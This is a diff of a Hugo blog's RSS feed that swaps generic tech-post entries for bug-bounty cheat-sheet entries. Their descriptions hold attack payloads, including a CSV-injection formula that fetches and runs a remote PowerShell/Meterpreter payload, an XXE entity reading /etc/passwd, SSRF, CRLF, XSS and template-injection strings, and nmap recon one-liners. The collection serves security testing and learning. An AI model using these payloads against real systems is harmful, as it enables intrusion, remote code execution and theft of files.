@@ -2,141 +2,230 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Armoghan</title>
-    <link>https://armoghan-ul-mohmin.github.io/Blogs/</link>
+    <link>https://example.com/</link>
     <description>Recent content on Armoghan</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language><atom:link href="https://armoghan-ul-mohmin.github.io/Blogs/index.xml" rel="self" type="application/rss+xml" />
+    <language>en-us</language>
+    <lastBuildDate>Sat, 11 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://example.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>An Introduction to Artificial Intelligence (AI)</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/ai/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <title>Books</title>
+      <link>https://example.com/cheatsheets/books/</link>
+      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/ai/</guid>
-      <description>Introduction Artificial Intelligence (AI) is a rapidly growing field that has the potential to transform our lives in countless ways. In this blog post, we&amp;rsquo;ll provide an introduction to AI, discuss its various applications, and explore some of the challenges and ethical considerations surrounding this exciting field.
-What is Artificial Intelligence? Artificial Intelligence refers to the development of intelligent machines that can perform tasks that normally require human intelligence, such as visual perception, speech recognition, decision making, and language translation.</description>
+      <guid>https://example.com/cheatsheets/books/</guid>
+      <description>Web and browser
+Web Hacking 101 by Peter Yaworski. Breaking into Information Security: Learning the Ropes 101 by Andy Gill. The Web Application Hacker’s Handbook: Finding and Exploiting Security Flaws by Dafydd Stuttard and Marcus Pinto.</description>
     </item>
     
     <item>
-      <title>CloudComputing</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/cloudcomputing/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <title>Bug Bounty Platforms</title>
+      <link>https://example.com/cheatsheets/bugbountyplatforms/</link>
+      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/cloudcomputing/</guid>
-      <description>Introduction Cloud computing is a model for enabling on-demand access to a shared pool of computing resources over the internet. In this blog post, we will cover the basic concepts of cloud computing and provide an overview of the major cloud providers.
-What is Cloud Computing? Cloud computing is the delivery of computing services—including servers, storage, databases, networking, software, analytics, and intelligence—over the internet (“the cloud”) to offer faster innovation, flexible resources, and economies of scale.</description>
+      <guid>https://example.com/cheatsheets/bugbountyplatforms/</guid>
+      <description>Open For Signup
+HackerOne Bugcrowd BountyFactory Intigriti Bugbountyjp Safehats BugbountyHQ Hackerhive Hackenproof Hacktrophy CESPPA Invite based Platforms
+Synack Cobalt Zerocopter Yogosha Bugbountyzone Antihack.me Vulnscope </description>
     </item>
     
     <item>
-      <title>Cryptocurrency and Blockchain</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/cryptocurrency-and-blockchain/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <title>Bug Bounty Tips</title>
+      <link>https://example.com/cheatsheets/bugbountytips/</link>
+      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/cryptocurrency-and-blockchain/</guid>
-      <description>Introduction Cryptocurrency and Blockchain are two terms that have been buzzing around the internet for the past few years. They are both related to each other and have caused a significant impact on the world of finance and technology. In this blog post, we will be discussing the basics of Cryptocurrency and Blockchain.
-What is Cryptocurrency? Cryptocurrency is a digital or virtual currency that uses cryptography for security. It operates independently of a central bank and uses decentralized technology for secure transactions.</description>
+      <guid>https://example.com/cheatsheets/bugbountytips/</guid>
+      <description>Tip #1
+Use GIT as a recon tool. Find the target&amp;rsquo;s GIT repositories, clone them, and then check the logs for information on the team not necessarily in the source code.</description>
     </item>
     
     <item>
-      <title>Cyber Security</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/cybersecurity/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <title>Content Injection</title>
+      <link>https://example.com/cheatsheets/content-injection/</link>
+      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/cybersecurity/</guid>
-      <description>Introduction Cybersecurity is the practice of protecting your digital assets from unauthorized access, theft, or damage. In today&amp;rsquo;s interconnected world, where businesses and individuals rely heavily on technology, cybersecurity is more important than ever before.
-In this post, we&amp;rsquo;ll cover some basic cybersecurity concepts and best practices that can help you protect your digital assets.
-Types of Cybersecurity Threats There are many types of cybersecurity threats, including:
-Malware: malicious software that can infect your computer and steal or destroy data Phishing: fraudulent emails or websites that trick you into providing personal information Social engineering: using psychological manipulation to trick people into giving up sensitive information Password attacks: attempting to guess or crack your passwords to gain access to your accounts Denial-of-service attacks: flooding a website or network with traffic to make it unavailable Best Practices for Cybersecurity Here are some best practices that can help you protect your digital assets:</description>
-    </item>
-    
-    <item>
-      <title>Cybersecurity for Small Businesses</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/cybersecurity-for-small-businesses/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/cybersecurity-for-small-businesses/</guid>
-      <description>Introduction As a small business owner, you may not think that your business is a target for cyber attacks. However, the truth is that small businesses are just as vulnerable to cyber threats as larger organizations. In fact, according to a study by Verizon, 43% of cyber attacks are aimed at small businesses. In this blog post, we&amp;rsquo;ll explore the importance of cybersecurity for small businesses and provide some tips for protecting your business from cyber threats.</description>
-    </item>
-    
-    <item>
-      <title>DataScience</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/datascience/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/datascience/</guid>
-      <description>Introduction Data Science is the field of study that uses scientific methods, algorithms, and statistical models to extract insights and knowledge from structured and unstructured data. In this blog post, we will cover the basic concepts of Data Science and provide an overview of the field.
-What is Data Science? Data Science is an interdisciplinary field that uses techniques from statistics, machine learning, and computer science to extract insights and knowledge from data.</description>
-    </item>
-    
-    <item>
-      <title>Getting Started in IT</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/getting-started-in-it/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/getting-started-in-it/</guid>
-      <description>Are you interested in pursuing a career in IT? With the increasing reliance on technology in almost every aspect of our lives, there has never been a better time to get started in this field. In this guide, we will cover the basics of what IT is, the different career paths available, and how to get started on your journey.
-What is IT? Information Technology (IT) is the use of computers, software, and networks to process, store, and distribute information.</description>
+      <guid>https://example.com/cheatsheets/content-injection/</guid>
+      <description>Content Injection ❤ bounty pls </description>
     </item>
     
     <item>
       <title>Git</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/git/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <link>https://example.com/posts/git/</link>
+      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/git/</guid>
+      <guid>https://example.com/posts/git/</guid>
       <description>Git is officially defined as a distributed version control system (VCS).
-In other words, it&amp;rsquo;s a system that tracks changes to our project files over time. It enables us to record project changes and go back to a specific version of the tracked files, at any given point in time. This system can be used by many people to efficiently work together and collaborate on team projects, where each developer can have their own version of the project, distributed on their computer.</description>
+In other words, it&amp;rsquo;s a system that tracks changes to our project files over time.</description>
     </item>
     
     <item>
-      <title>Install Git</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/installgit/</link>
+      <title></title>
+      <link>https://example.com/cheatsheets/cors/cors/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/installgit/</guid>
-      <description>This article will guide you on how to install Git command line tools along with Git Bash, which is a terminal shell which will allow you to use UNIX terminal commands and utilities on your Windows operating system.
-You can find the Windows installer available for download here: https://git-scm.com/downloads
-https://git-scm.com/download/win
-Your download should start automatically, but if it doesn&amp;rsquo;t for some reason, you can follow the If your download hasn&amp;rsquo;t started, click here to download manually.</description>
+      <guid>https://example.com/cheatsheets/cors/cors/</guid>
+      <description>Cross Origin Resource Sharing (CORS) Testing: curl --head -s &#39;http://example.com/api/v1/secret&#39; -H &#39;Origin: http://evil.com&#39;
+Check to see what the server responds with in the Access-Control-Allow-Origin: (if anything) and if so, check if Access-Control-Allow-Credentials: true is present.</description>
     </item>
     
     <item>
-      <title>IOT</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/iot/</link>
+      <title></title>
+      <link>https://example.com/cheatsheets/crlf/crlf/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/iot/</guid>
-      <description>Introduction The Internet of Things (IoT) is the interconnection of smart devices, sensors, and other objects to the internet. This technology is transforming the way we live and work, creating new opportunities for businesses and individuals alike. In this blog post, we will explore the basics of IoT and how it works.
-What is the Internet of Things? The Internet of Things (IoT) is the network of physical devices, vehicles, home appliances, and other items embedded with electronics, software, sensors, and connectivity which enables these objects to connect and exchange data.</description>
+      <guid>https://example.com/cheatsheets/crlf/crlf/</guid>
+      <description>CRLF Injection || HTTP Response Splitting %0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Header-based test, site root
+%0d%0aheader:header %0aheader:header %0dheader:header %23%0dheader:header %3f%0dheader:header /%250aheader:header /%25250aheader:header /%%0a0aheader:header /%3f%0dheader:header /%23%0dheader:header /%25%30aheader:header /%25%30%61header:header /%u000aheader:header CRLF chained with Open Redirect server misconfiguration</description>
     </item>
     
     <item>
-      <title>Network Administration</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/network-administration/</link>
+      <title></title>
+      <link>https://example.com/cheatsheets/crypto/crypto/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/network-administration/</guid>
-      <description>What is Network Administration? Network administration is the process of managing and maintaining computer networks. It involves configuring network devices, monitoring network performance, and troubleshooting network issues. Network administrators play a critical role in ensuring that networks are secure, reliable, and efficient.
-Why is Network Administration Important? Network administration is important because computer networks are an essential part of many businesses and organizations. Networks enable users to share resources, communicate, and collaborate.</description>
+      <guid>https://example.com/cheatsheets/crypto/crypto/</guid>
+      <description>Crypto MD5 Collision Strings
+%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 URL decode strings.4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea24dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2SHA-1 Collision Strings
+%25%50%44%46%2D%31%2E%33%0A%25%E2%E3%CF%D3%0A%0A%0A%31%20%30%20%6F%62%6A%0A%3C%3C%2F%57%69%64%74%68%20%32%20%30%20%52%2F%48%65%69%67%68%74%20%33%20%30%20%52%2F%54%79%70%65%20%34%20%30%20%52%2F%53%75%62%74%79%70%65%20%35%20%30%20%52%2F%46%69%6C%74%65%72%20%36%20%30%20%52%2F%43%6F%6C%6F%72%53%70%61%63%65%20%37%20%30%20%52%2F%4C%65%6E%67%74%68%20%38%20%30%20%52%2F%42%69%74%73%50%65%72%43%6F%6D%70%6F%6E%65%6E%74%20%38%3E%3E%0A%73%74%72%65%61%6D%0A%FF%D8%FF%FE%00%24%53%48%41%2D%31%20%69%73%20%64%65%61%64%21%21%21%21%21%85%2F%EC%09%23%39%75%9C%39%B1%A1%C6%3C%4C%97%E1%FF%FE%01%73%46%DC%91%66%B6%7E%11%8F%02%9A%B6%21%B2%56%0F%F9%CA%67%CC%A8%C7%F8%5B%A8%4C%79%03%0C%2B%3D%E2%18%F8%6D%B3%A9%09%01%D5%DF%45%C1%4F%26%FE%DF%B3%DC%38%E9%6A%C2%2F%E7%BD%72%8F%0E%45%BC%E0%46%D2%3C%57%0F%EB%14%13%98%BB%55%2E%F5%A0%A8%2B%E3%31%FE%A4%80%37%B8%B5%D7%1F%0E%33%2E%DF%93%AC%35%00%EB%4D%DC%0D%EC%C1%A8%64%79%0C%78%2C%76%21%56%60%DD%30%97%91%D0%6B%D0%AF%3F%98%CD%A4%BC%46%29%B1 %25%50%44%46%2D%31%2E%33%0A%25%E2%E3%CF%D3%0A%0A%0A%31%20%30%20%6F%62%6A%0A%3C%3C%2F%57%69%64%74%68%20%32%20%30%20%52%2F%48%65%69%67%68%74%20%33%20%30%20%52%2F%54%79%70%65%20%34%20%30%20%52%2F%53%75%62%74%79%70%65%20%35%20%30%20%52%2F%46%69%6C%74%65%72%20%36%20%30%20%52%2F%43%6F%6C%6F%72%53%70%61%63%65%20%37%20%30%20%52%2F%4C%65%6E%67%74%68%20%38%20%30%20%52%2F%42%69%74%73%50%65%72%43%6F%6D%70%6F%6E%65%6E%74%20%38%3E%3E%0A%73%74%72%65%61%6D%0A%FF%D8%FF%FE%00%24%53%48%41%2D%31%20%69%73%20%64%65%61%64%21%21%21%21%21%85%2F%EC%09%23%39%75%9C%39%B1%A1%C6%3C%4C%97%E1%FF%FE%01%7F%46%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2%56%0B%45%CA%67%D6%88%C7%F8%4B%8C%4C%79%1F%E0%2B%3D%F6%14%F8%6D%B1%69%09%01%C5%6B%45%C1%53%0A%FE%DF%B7%60%38%E9%72%72%2F%E7%AD%72%8F%0E%49%04%E0%46%C2%30%57%0F%E9%D4%13%98%AB%E1%2E%F5%BC%94%2B%E3%35%42%A4%80%2D%98%B5%D7%0F%2A%33%2E%C3%7F%AC%35%14%E7%4D%DC%0F%2C%C1%A8%74%CD%0C%78%30%5A%21%56%64%61%30%97%89%60%6B%D0%BF%3F%98%CD%A8%04%46%29%A1 URL decode strings.255044462D312E330A25E2E3CFD30A0A0A312030206F626A0A3C3C2F57696474682032203020522F4865696768742033203020522F547970652034203020522F537562747970652035203020522F46696C7465722036203020522F436F6C6F7253706163652037203020522F4C656E6774682038203020522F42697473506572436F6D706F6E656E7420383E3E0A73747265616D0AFFD8FFFE00245348412D3120697320646561642121212121852FEC092339759C39B1A1C63C4C97E1FFFE017F46DC93A6B67E013B029AAA1DB2560B45CA67D688C7F84B8C4C791FE02B3DF614F86DB1690901C56B45C1530AFEDFB76038E972722FE7AD728F0E4904E046C230570FE9D41398ABE12EF5BC942BE33542A4802D98B5D70F2A332EC37FAC3514E74DDC0F2CC1A874CD0C78305A21566461309789606BD0BF3F98CDA8044629A1255044462D312E330A25E2E3CFD30A0A0A312030206F626A0A3C3C2F57696474682032203020522F4865696768742033203020522F547970652034203020522F537562747970652035203020522F46696C7465722036203020522F436F6C6F7253706163652037203020522F4C656E6774682038203020522F42697473506572436F6D706F6E656E7420383E3E0A73747265616D0AFFD8FFFE00245348412D3120697320646561642121212121852FEC092339759C39B1A1C63C4C97E1FFFE017346DC9166B67E118F029AB621B2560FF9CA67CCA8C7F85BA84C79030C2B3DE218F86DB3A90901D5DF45C14F26FEDFB3DC38E96AC22FE7BD728F0E45BCE046D23C570FEB141398BB552EF5A0A82BE331FEA48037B8B5D71F0E332EDF93AC3500EB4DDC0DECC1A864790C782C76215660DD309791D06BD0AF3F98CDA4BC4629B1Bcrypt (BSD) Wraparound Bug</description>
     </item>
     
     <item>
-      <title>Quantum Computing</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/quantum-computing/</link>
+      <title></title>
+      <link>https://example.com/cheatsheets/csv-injection/csv-injection/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/quantum-computing/</guid>
-      <description>Introduction Quantum computing is a new field of computing that is based on the principles of quantum mechanics. Unlike classical computing, which uses bits to represent information as either a 0 or a 1, quantum computing uses quantum bits, or qubits, which can represent a 0, a 1, or both at the same time. This allows quantum computers to perform certain types of calculations much faster than classical computers.
-How does it work?</description>
+      <guid>https://example.com/cheatsheets/csv-injection/csv-injection/</guid>
+      <description>CSV Injection Newline character
+%0A-3+3+cmd|&amp;#39; /C calc&amp;#39;!D2 Meterpreter Shell
+=cmd|&amp;#39;/C powershell IEX(wget bit.ly/1X146m3)&amp;#39;!A0 </description>
     </item>
     
     <item>
-      <title>Software Development</title>
-      <link>https://armoghan-ul-mohmin.github.io/Blogs/posts/software-development/</link>
+      <title></title>
+      <link>https://example.com/cheatsheets/lfi/lfi/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://armoghan-ul-mohmin.github.io/Blogs/posts/software-development/</guid>
-      <description>What is Software Development? Software development is the process of designing, building, testing, and maintaining software applications. It involves writing code, debugging, and ensuring that the software performs as expected. Software development can be done using various programming languages, tools, and frameworks.
-Why is Software Development Important? Software development is important because it enables businesses and individuals to create software applications that solve real-world problems. Software development can help automate manual tasks, improve efficiency, and create new revenue streams.</description>
+      <guid>https://example.com/cheatsheets/lfi/lfi/</guid>
+      <description>LFI Filter Bypass
+../\ ..\/ /.. \/.. /%5c.. FFmpeg Local File Disclosure
+This script by @neex can be used to disclose local files on FFmpeg hosts which parse externally-referencing HLS playlists.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/open-redirect/open-redirect/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/open-redirect/open-redirect/</guid>
+      <description>Open Redirect /%09/google.com /%5cgoogle.com //www.google.com/%2f%2e%2e //www.google.com/%2e%2e //google.com/ //google.com/%2f.. //\google.com /\victim.com:80%40google.com Possible open redirect parameters ?url=http://{target} ?url=https://{target} ?next=http://{target} ?next=https://{target} ?url=https://{target} ?url=http://{target} ?url=//{target} ?url=$2f%2f{target} ?next=//{target} ?next=$2f%2f{target} ?url=//{target} ?</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/practice-platforms/practice-platforms/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/practice-platforms/practice-platforms/</guid>
+      <description>Practice Platforms Pentesterlab XSS Game Hack This Site Root-Me HackTheBox Hack Me CTF 365 Google Gruyere OWASP Juice Shop Hack Yourself First flAWS Cloud bWAPP [OWASP Mutillidae] (https://www.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/rce/rce/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/rce/rce/</guid>
+      <description>RCE Werkzeug Debugger
+Find somewhere where user input can be supplied and submit the following string to cause an error:
+strіng If the target is running their application in debug mode you might be able to run commands.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/recon/recon/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/recon/recon/</guid>
+      <description>Certspotter curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq &amp;#39;.[].dns_names[]&amp;#39; | sed &amp;#39;s/\&amp;#34;//g&amp;#39; | sed &amp;#39;s/\*\.//g&amp;#39; | uniq curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq &amp;#39;.[].dns_names[]&amp;#39; | sed &amp;#39;s/\&amp;#34;//g&amp;#39; | sed &amp;#39;s/\*\.//g&amp;#39; | uniq | dig +short -f - | uniq | nmap -T5 -Pn -sS -i - -p 80,443,21,22,8080,8081,8443 --open -n -oG - Sublist3r One-liner This runs Sublist3r on a list of domains and outputs the results in separate files.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/special-tools/special-tools/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/special-tools/special-tools/</guid>
+      <description>Special Tools Resolution
+http://dnsbin.zhack.ca (DNS) http://pingb.in (DNS) https://www.mockbin.org/ (HTTP) Wildcard DNS
+http://xip.io 10.0.0.1.xip.iowww.10.0.0.1.xip.iomysite.10.0.0.1.xip.iofoo.bar.10.0.0.1.xip.io http://nip.io 10.0.0.1.nip.ioapp.10.0.0.1.nip.iocustomer1.app.10.0.0.1.nip.iocustomer2.app.10.0.0.1.nip.iootherapp.10.0.0.1.nip.io Reconnaissance
+https://spyse.com (fully-fledged recon service) https://dnsdumpster.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/sqli/sqli/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/sqli/sqli/</guid>
+      <description>SQLI Akamai Kona Bypass
+MID instead of SUBSTRING LIKE instead of = /**/ instead of a space CURRENT_USER instead of CURRENT_USER() &amp;quot; instead of &#39; Final example:</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/ssrf/ssrf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/ssrf/ssrf/</guid>
+      <description>SSRF http://0177.1/ http://0x7f.1/ http://127.000.000.1 https://520968996 Note: The latter can be calculated using http://www.subnetmask.info/
+Exotic Handlers
+gopher://, dict://, php://, jar://, tftp:// IPv6
+http://[::1] http://[::] Wildcard DNS</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/template-injection/template-injection/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/template-injection/template-injection/</guid>
+      <description>Template Injection Ruby
+&amp;lt;%=`id`%&amp;gt; Twig
+The following payload should output 49.
+{{7*&amp;#39;7&amp;#39;}} Jinja
+This payload should output 7777777.
+{{7*&amp;#39;7&amp;#39;}} </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/xslt/xslt/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/xslt/xslt/</guid>
+      <description>XSLT Injection Backend infos
+&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;html xsl:version=&amp;#34;1.0&amp;#34; xmlns:xsl=&amp;#34;http://www.w3.org/1999/XSL/Transform&amp;#34; xmlns:php=&amp;#34;http://php.net/xsl&amp;#34;&amp;gt; &amp;lt;body&amp;gt; &amp;lt;xsl:text&amp;gt;xsl:vendor = &amp;lt;/xsl:text&amp;gt;&amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:vendor&amp;#39;)&amp;#34;/&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;xsl:text&amp;gt;xsl:version = &amp;lt;/xsl:text&amp;gt;&amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:version&amp;#39;)&amp;#34;/&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Injecting in PHP</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/xss/xss/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/xss/xss/</guid>
+      <description>XSS Chrome XSS-Auditor Bypass by @vivekchsm
+&amp;lt;svg&amp;gt;&amp;lt;animate xlink:href=#x attributeName=href values=&amp;amp;#106;avascript:alert(1) /&amp;gt;&amp;lt;a id=x&amp;gt;&amp;lt;rect width=100 height=100 /&amp;gt;&amp;lt;/a&amp;gt; Chrome &amp;lt; v60 beta XSS-Auditor Bypass
+&amp;lt;script src=&amp;#34;data:,alert(1)%250A--&amp;gt; Other Chrome XSS-Auditor Bypasses</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://example.com/cheatsheets/xxe/xxe/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/cheatsheets/xxe/xxe/</guid>
+      <description>LFI Test
+&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo (#ANY)&amp;gt;&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;]&amp;gt;&amp;lt;foo&amp;gt;&amp;amp;xxe;&amp;lt;/foo&amp;gt; Blind LFI test (when first case doesn&amp;rsquo;t return anything)
+&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&amp;lt;!</description>
     </item>
     
   </channel>
